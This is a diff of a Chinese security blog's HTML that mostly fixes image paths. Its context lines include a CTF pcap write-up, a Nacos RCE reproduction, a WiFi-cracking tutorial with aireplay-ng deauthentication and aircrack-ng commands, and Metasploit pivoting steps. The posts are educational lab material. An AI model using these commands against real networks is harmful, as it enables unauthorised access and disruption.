@@ -99,39 +99,39 @@
 <li>第一小问</li>
 </ul>
 <p>通过wireshark分析pcap包，直接过滤条件选择&#x3D;“http.request.method&#x3D;&#x3D;POST”</p>
-<p><img src="/../images%5C%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA%5C1.png" alt="1"></p>
+<p><img src="/../images/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/1.png" alt="1"></p>
 <p>我们观察登录路径，找到login.php关键词。其实在这里还是能看到好多POST login.php的报文。我们通过wireshark默认的时间排序，去找到最后仍然在post login.php的包，去尝试回答flag。那如果想更精准的确定是哪个包的话，我们可以通过追踪这条数据流，去看这条数据流的上下报文，通过观察目标机和发起机的响应报文判断是否成功。</p>
 <p><img src="/../images/2.png" alt="2"></p>
 <p>正确答案：admin!@#pass123</p>
-<p><img src="/../images%5C%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA%5C3.png" alt="3"></p>
+<p><img src="/../images/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/3.png" alt="3"></p>
 <ul>
 <li>第二小问</li>
 </ul>
 <p>  依据上一问，找到攻击者成功拿到密码登录的信息，根据wireshark依时间排序的流量继续看，该数据包是在No.733517。我们去过滤http协议，然后找到733517去观察前后数据包信息。</p>
-<p>  <img src="/../images%5C%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA%5C3.1.png" alt="3.1"></p>
+<p>  <img src="/../images/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/3.1.png" alt="3.1"></p>
 <p>  我们此时找到No.733517，去查看后续hack机-192.168.94.59和目标机-192.168.32.189的请求报文和回显报文，尽量多关注回显报文。一点一点找，看到可以flag，拿去尝试，拿下。</p>
-<p>  <img src="/../images%5C%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA%5C3.2.png" alt="3.2"></p>
+<p>  <img src="/../images/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/3.2.png" alt="3.2"></p>
 <ul>
 <li><p>第三小问</p>
 <p>顺着第二小问的思路，继续往下看。图片中可以看到，在No.734555和No.734560是有POST a.php这个数据的，应该是一个webshell马。通过马子读到了database的配置信息，其中包含dbpass。</p>
-<p>![3.4](..&#x2F;images\玄机应急靶场\第六章 流量特征分析-waf 上的截获的黑客攻击流量\3.4.png)</p>
+<p>![3.4](..&#x2F;images&#x2F;玄机应急靶场&#x2F;第六章 流量特征分析-waf 上的截获的黑客攻击流量&#x2F;3.4.png)</p>
 </li>
 </ul>
-<p>![3.3](..&#x2F;images\玄机应急靶场\第六章 流量特征分析-waf 上的截获的黑客攻击流量\3.3.png)</p>
+<p>![3.3](..&#x2F;images&#x2F;玄机应急靶场&#x2F;第六章 流量特征分析-waf 上的截获的黑客攻击流量&#x2F;3.3.png)</p>
 <ul>
 <li><p>投机</p>
 <p>利用工具解决——&gt;CTF流量分析</p>
 </li>
 </ul>
-<p><img src="/../images%5C%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA%5C4.png" alt="4"></p>
+<p><img src="/../images/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/4.png" alt="4"></p>
 <p>2、flag{87b7cb79481f317bde90c116cf36084b}</p>
-<p><img src="/../images%5C%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA%5C5.png" alt="5"></p>
+<p><img src="/../images/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/5.png" alt="5"></p>
 <p>3、flag{e667jUPvJjXHvEUv}</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/07/17/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/" data-id="cuidv4F3jWpSgkTeVmaPM7yji" data-title="玄机应急靶场" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2024/07/17/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/" data-id="cuidbDxFTe7TxRpuHo66Wk32r" data-title="玄机应急靶场" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -177,24 +177,24 @@
 </ul>
 </li>
 </ul>
-<p><img src="/../images%5C2.png" alt="2"></p>
+<p><img src="/../images/2.png" alt="2"></p>
 <h5 id="1-1-windows下本地复现"><a href="#1-1-windows下本地复现" class="headerlink" title="1.1 windows下本地复现"></a>1.1 windows下本地复现</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载好nacos-server-2.3.2.zip后，解压到本地，进入/nacos/bin下执行   startup.cmd -m standalone 启动nacos</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images%5C3.png" alt="3"></p>
+<p><img src="/../images/3.png" alt="3"></p>
 <ul>
 <li>执行rce脚本的service.py</li>
 </ul>
-<p><img src="/../images%5C4.png" alt="4"></p>
+<p><img src="/../images/4.png" alt="4"></p>
 <ul>
 <li>随后执行exploit.py，输入本地环境，默认执行命令calc，成功触发</li>
 </ul>
-<p><img src="/../images%5C5.png" alt="5"></p>
+<p><img src="/../images/5.png" alt="5"></p>
 <h3 id="三、参考文章"><a href="#三、参考文章" class="headerlink" title="三、参考文章"></a>三、参考文章</h3><p>0x01：<a target="_blank" rel="noopener" href="https://github.com/FFR66/Nacos_Rce">https://github.com/FFR66/Nacos_Rce</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/07/16/Nacos%200day%20%E5%A4%8D%E7%8E%B0/" data-id="cuidF40pnvR1yVgpL9iOIzy_R" data-title="Nacos 0day 复现" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2024/07/16/Nacos%200day%20%E5%A4%8D%E7%8E%B0/" data-id="cuidM9NPm_1jPrN17VJYr8Cfy" data-title="Nacos 0day 复现" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -235,7 +235,7 @@
 <li>kali(Aircrack-ng)</li>
 <li>一块无线监听网卡</li>
 </ul>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E4%B8%80%E5%9D%97%E6%97%A0%E7%BA%BF%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1-17181092259909.jpg" alt="一块无线监听网卡"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E4%B8%80%E5%9D%97%E6%97%A0%E7%BA%BF%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1-17181092259909.jpg" alt="一块无线监听网卡"></p>
 <h4 id="2、使用场景"><a href="#2、使用场景" class="headerlink" title="2、使用场景"></a>2、使用场景</h4><ul>
 <li><del>没流量了</del></li>
 <li>近源爆破</li>
@@ -245,21 +245,21 @@
 <h4 id="3、操作手法"><a href="#3、操作手法" class="headerlink" title="3、操作手法"></a>3、操作手法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一插二看三爆破</span><br></pre></td></tr></table></figure>
 
 <p>1、连接监听网卡——物理插入</p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1-%E7%89%A9%E7%90%86%E6%8F%92%E5%85%A5.jpg" alt="连接虚拟网卡-物理插入"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1-%E7%89%A9%E7%90%86%E6%8F%92%E5%85%A5.jpg" alt="连接虚拟网卡-物理插入"></p>
 <p>2、连接虚拟网卡——逻辑插入</p>
 <ul>
 <li>因为kali用的虚拟机，所以此时需要在虚拟机vmware中重新连接一次</li>
 </ul>
-<p>  <img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5Ckali-wifi%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE.png" alt="kali-wifi网卡配置"></p>
+<p>  <img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/kali-wifi%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE.png" alt="kali-wifi网卡配置"></p>
 <p>3、ifconfig 查看是监听网卡否插入，观察是否出现wlan0，airmon-ng  查看网卡状态</p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1.png" alt="监听网卡"></p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E5%8F%AF%E7%94%A8%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1.png" alt="查看当前可用监听网卡"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1.png" alt="监听网卡"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E5%8F%AF%E7%94%A8%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1.png" alt="查看当前可用监听网卡"></p>
 <p>4、airmon-ng start waln0 开启监听模式</p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC.png" alt="开启监听"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC.png" alt="开启监听"></p>
 <p> 此时，再次执行ifconfig命令，可以看到网卡已经变为wlan0mon，代表已经开启监听。</p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%B7%B2%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F.png" alt="可以看到已开启监听模式"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%B7%B2%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F.png" alt="可以看到已开启监听模式"></p>
 <p>5、airodump-ng wlan0mon  开始扫描设备，探测周围存活可用网络。（我的这个监听网卡仅能探测2.4G网络的，硬件不同，能探测到的频率也不同），随后确定要破解的wifi的bissd 和 ch 和 essid （目前大多数wifi都是wpa2加密的）</p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5Cimage-20240611204515550.png" alt="image-20240611204515550"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/image-20240611204515550.png" alt="image-20240611204515550"></p>
 <ul>
 <li>常见的WIFI加密模式</li>
 </ul>
@@ -268,25 +268,25 @@
 <p>6、准备抓取握手包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --ivs --bssid 对应ID -w 输出位置 -c 对应信道 wlan0mon</span><br><span class="line">airodump-ng  -c 信道 --bssid 对应id -w 输出位置 wlan0mon</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E6%8A%93%E5%8F%96%E6%8F%A1%E6%89%8B%E5%8C%85.png" alt="抓取握手包"></p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E6%8A%93%E5%8F%96%E6%8F%A1%E6%89%8B%E5%8C%852.png" alt="抓取握手包2"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E6%8A%93%E5%8F%96%E6%8F%A1%E6%89%8B%E5%8C%85.png" alt="抓取握手包"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E6%8A%93%E5%8F%96%E6%8F%A1%E6%89%8B%E5%8C%852.png" alt="抓取握手包2"></p>
 <p>7、如果抓不到握手包，就强制连接把对方踢下线，对方会重新代着正确的密码去连接，我们此时就会抓到正确的握手包。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 1 -a C8:3A:35:70:21:61 -c 5C:F7:C3:92:0A:DD wlan0mon</span><br></pre></td></tr></table></figure>
 
 <p>​	-0 模式，后面跟你要攻击的次数我给的是20，如果过大对方则会一直连接不上。</p>
 <p>​	-a 无线APmac地址</p>
 <p>​	-c 客户端mac地址</p>
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E5%BC%BA%E5%88%B6%E8%BF%9E%E6%8E%A5%E6%8A%93%E5%88%B0%E6%8F%A1%E6%89%8B%E5%8C%85.png" alt="强制连接抓到握手包"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E5%BC%BA%E5%88%B6%E8%BF%9E%E6%8E%A5%E6%8A%93%E5%88%B0%E6%8F%A1%E6%89%8B%E5%8C%85.png" alt="强制连接抓到握手包"></p>
 <p>8、利用字典爆破握手包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng  -w 字典路径  握手包路径</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images%5C%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95%5C%E6%92%9E%E5%BA%93%E6%88%90%E5%8A%9F.png" alt="撞库成功"></p>
+<p><img src="/../images/%E6%B5%85%E8%B0%88WIFI%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%89%8B%E6%B3%95/%E6%92%9E%E5%BA%93%E6%88%90%E5%8A%9F.png" alt="撞库成功"></p>
 <h4 id="4、参考连接"><a href="#4、参考连接" class="headerlink" title="4、参考连接"></a>4、参考连接</h4><p>0x01:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2028958">https://cloud.tencent.com/developer/article/2028958</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/06/25/%E5%9F%BA%E4%BA%8E%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E7%9B%91%E5%90%AC%E7%9A%84WIFI%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" data-id="cuidW_9rv6sUNBOoqGBw7FUt-" data-title="基于无线网卡监听的WIFI暴力破解" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2024/06/25/%E5%9F%BA%E4%BA%8E%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E7%9B%91%E5%90%AC%E7%9A%84WIFI%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" data-id="cuidN4Wumnv7uLAB41WwURY6n" data-title="基于无线网卡监听的WIFI暴力破解" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -339,32 +339,32 @@
 <li><p>类型</p>
 </li>
 <li><p>正向代理：正向代理代理的是客户端，客户发送请求给到代理服务器，代理服务器代替客户把请求发送给服务器。（此时真实的客户端是匿名的）</p>
-<p>![正向代理](F:\原E盘\迅雷下载\web security  study note\内网渗透中代理细谈\正向代理.png)</p>
+<p>![正向代理](F:&#x2F;原E盘&#x2F;迅雷下载&#x2F;web security  study note&#x2F;内网渗透中代理细谈&#x2F;正向代理.png)</p>
 </li>
 <li><p>反向代理：代理的是服务端，客户端发送请求到代理服务器，代理服务器将收集到的请求分发给后面的服务器，对应的服务器处理完将结果返回代理服务器，代理再将结果给到客户端。（此时真实的服务器是匿名的）</p>
 </li>
 </ul>
-<p>  ![image-20240514192420883](F:\原E盘\迅雷下载\web security  study note\内网渗透中代理细谈\反向代理.png)</p>
+<p>  ![image-20240514192420883](F:&#x2F;原E盘&#x2F;迅雷下载&#x2F;web security  study note&#x2F;内网渗透中代理细谈&#x2F;反向代理.png)</p>
 <h3 id="1、HTTP-PROXY"><a href="#1、HTTP-PROXY" class="headerlink" title="1、HTTP PROXY"></a>1、HTTP PROXY</h3><p>仅支持http&#x2F;https协议。https代理需要加证书和解密流量。</p>
 <ul>
 <li><p><strong>实现方式</strong></p>
 <p>形象生动的说明：</p>
 </li>
 </ul>
-<p><img src="/../images%5Cimage-20240513231146353.png" alt="image-20240513231146353"></p>
+<p><img src="/../images/image-20240513231146353.png" alt="image-20240513231146353"></p>
 <ul>
 <li><strong>举个栗子</strong></li>
 </ul>
 <p>  我利用浏览器插件（SwitchyOmega）配置了http代理，代理服务器为127.0.0.1:8080这个端口，那么相当于我所有浏览器所有要访问互联网的流量都需要先通过代理服务器才会到互联网(如图1-3)。</p>
-<p>  <img src="/../images%5Cimage-20240513231224977.png" alt="image-20240513231224977"></p>
+<p>  <img src="/../images/image-20240513231224977.png" alt="image-20240513231224977"></p>
 <p>  ​																											<strong>图1-1</strong></p>
-<p><img src="/../images%5Cimage-20240513231325234.png" alt="image-20240513231325234"></p>
+<p><img src="/../images/image-20240513231325234.png" alt="image-20240513231325234"></p>
 <p>​																													 <strong>图1-2</strong></p>
-<p><img src="/../images%5Cimage-20240513231444790.png" alt="image-20240513231444790"></p>
+<p><img src="/../images/image-20240513231444790.png" alt="image-20240513231444790"></p>
 <p>​																														<strong>图1-3</strong></p>
-<p><img src="/../images%5Cimage-20240513231920293.png" alt="image-20240513231920293"></p>
+<p><img src="/../images/image-20240513231920293.png" alt="image-20240513231920293"></p>
 <p>​																														<strong>图1-4</strong></p>
-<p><img src="/../images%5Cimage-20240513232034143.png"></p>
+<p><img src="/../images/image-20240513232034143.png"></p>
 <p>​																														<strong>图1-5</strong></p>
 <ul>
 <li><p>应用场景</p>
@@ -398,7 +398,7 @@
 <ul>
 <li>工作原理图</li>
 </ul>
-<p><img src="/../images%5Csocks%E5%8E%9F%E7%90%86%E5%9B%BE.jpg" alt="socks原理图"></p>
+<p><img src="/../images/socks%E5%8E%9F%E7%90%86%E5%9B%BE.jpg" alt="socks原理图"></p>
 <ul>
 <li><p>SOCKS4 VS SOCKS5</p>
 <ul>
@@ -413,11 +413,11 @@
 </ul>
 </li>
 </ul>
-<p><img src="/../images%5Ckali-IP.png" alt="kali-IP"></p>
+<p><img src="/../images/kali-IP.png" alt="kali-IP"></p>
 <p>​																								<strong>图 - 攻击机</strong></p>
-<p><img src="/../images%5C%E9%9D%B6%E6%9C%BA1-ip.png" alt="靶机1-ip"></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA1-ip.png" alt="靶机1-ip"></p>
 <p>​																									<strong>图 - 靶机-1</strong></p>
-<p><img src="/../images%5C%E9%9D%B6%E6%9C%BA2-ip.png" alt="靶机2-ip"></p>
+<p><img src="/../images/%E9%9D%B6%E6%9C%BA2-ip.png" alt="靶机2-ip"></p>
 <p>​																									<strong>图 - 靶机-2</strong></p>
 <ul>
 <li><ul>
@@ -425,26 +425,26 @@
 </ul>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.1.2.0/24</span><br><span class="line">bg</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p>  <img src="/../images%5C%E8%A6%81%E5%87%86%E5%A4%87%E5%86%99%E8%B7%AF%E7%94%B1.png" alt="要准备写路由"></p>
+<p>  <img src="/../images/%E8%A6%81%E5%87%86%E5%A4%87%E5%86%99%E8%B7%AF%E7%94%B1.png" alt="要准备写路由"></p>
 <p>  先看下，再没制作和使用代理前，是无法向172.16.13.0&#x2F;24网段进行通信的。</p>
-<p>  <img src="/../images%5C%E6%97%A0%E6%B3%95%E9%80%9A%E4%BF%A1%E8%AF%81%E6%98%8E.png" alt="无法通信证明"></p>
+<p>  <img src="/../images/%E6%97%A0%E6%B3%95%E9%80%9A%E4%BF%A1%E8%AF%81%E6%98%8E.png" alt="无法通信证明"></p>
 <p>  添加了对应路由。</p>
 <p>  <img src="/../images/%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1.png" alt="添加路由"></p>
 <p>  接下来我们使用这个辅助模块：auxiliary&#x2F;server&#x2F;socks_proxy，我配置的参数为，127.0.0.1：1080</p>
-<p>  <img src="/../images%5C%E9%85%8D%E7%BD%AEsocks.png" alt="配置socks"></p>
+<p>  <img src="/../images/%E9%85%8D%E7%BD%AEsocks.png" alt="配置socks"></p>
 <p>  这边的配置要和proxychains4.conf的配置要一致。</p>
-<p>  <img src="/../images%5C%E9%85%8D%E7%BD%AE%E6%B3%A8%E6%84%8F.png" alt="配置注意"></p>
+<p>  <img src="/../images/%E9%85%8D%E7%BD%AE%E6%B3%A8%E6%84%8F.png" alt="配置注意"></p>
 <p>  我们再去重新telnet，可以看到是没问题的。</p>
-<p>  <img src="/../images%5C%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F%E9%AA%8C%E8%AF%81.png" alt="配置成功验证"></p>
+<p>  <img src="/../images/%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F%E9%AA%8C%E8%AF%81.png" alt="配置成功验证"></p>
 <p>  执行Nmap命令</p>
-<p>  <img src="/../images%5Cnmap%E6%B5%8B%E8%AF%95socks.png" alt="nmap测试socks"></p>
+<p>  <img src="/../images/nmap%E6%B5%8B%E8%AF%95socks.png" alt="nmap测试socks"></p>
 </li>
 <li><p>代理链工具：proxychains(Linux)，proxifier(Windows)</p>
-<p><img src="/../images%5C%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7proxychains.png" alt="代理工具proxychains"></p>
+<p><img src="/../images/%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7proxychains.png" alt="代理工具proxychains"></p>
 <p>proxychains4.conf 默认在&#x2F;etc&#x2F;proxychains4.conf下 </p>
-<p><img src="/../images%5Cproxychains4%E8%B7%AF%E5%BE%84.png" alt="proxychains4路径"></p>
-<p><img src="/../images%5Cproxychains%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="proxychains配置文件"></p>
-<p><img src="/../images%5Cproxiffer.png" alt="proxiffer"></p>
+<p><img src="/../images/proxychains4%E8%B7%AF%E5%BE%84.png" alt="proxychains4路径"></p>
+<p><img src="/../images/proxychains%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="proxychains配置文件"></p>
+<p><img src="/../images/proxiffer.png" alt="proxiffer"></p>
 </li>
 <li><p>端口转发工具：NC，LCX，IOX 等等</p>
 </li>
@@ -473,7 +473,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/31/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E4%BB%A3%E7%90%86%E7%BB%86%E8%B0%88/" data-id="cuidzoss1fKYDRrLPc3U_fQkP" data-title="内网渗透中代理细谈" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2024/05/31/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E4%BB%A3%E7%90%86%E7%BB%86%E8%B0%88/" data-id="cuidAJik8WrmZdfrTWcQ__7iy" data-title="内网渗透中代理细谈" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -514,7 +514,7 @@
 <ul>
 <li><p>下载附件后，有两个文件，一个py,一个txt</p>
 </li>
-<li><p><img src="/../images%5Cimage-20231220111722255.png" alt="image-20231220111722255"></p>
+<li><p><img src="/../images/image-20231220111722255.png" alt="image-20231220111722255"></p>
 </li>
 <li><p>首先了解一下AES（非对称加密（加解密使用同一种密钥））如何加密的（python3.11环境实现）</p>
 </li>
@@ -556,7 +556,7 @@ print(key_b.decode()) #字节型数据转换成中文数据
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/20/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Dcrypto-aes/" data-id="cuid_Fv5o29bSWy42DGgy3eeK" data-title="ACTF新生赛2020]crypto-aes" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2023/12/20/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Dcrypto-aes/" data-id="cuidtZeVwq_d-teVQXXnSW5S5" data-title="ACTF新生赛2020]crypto-aes" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -620,7 +620,7 @@ print(key_b.decode()) #字节型数据转换成中文数据
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/26/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/" data-id="cuid90cMTpwuRbUGWA2JeEVpS" data-title="数据安全风险评估" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2023/08/26/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/" data-id="cuidy8JXD0L3Fsm415vVen-Fz" data-title="数据安全风险评估" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -660,9 +660,9 @@ print(key_b.decode()) #字节型数据转换成中文数据
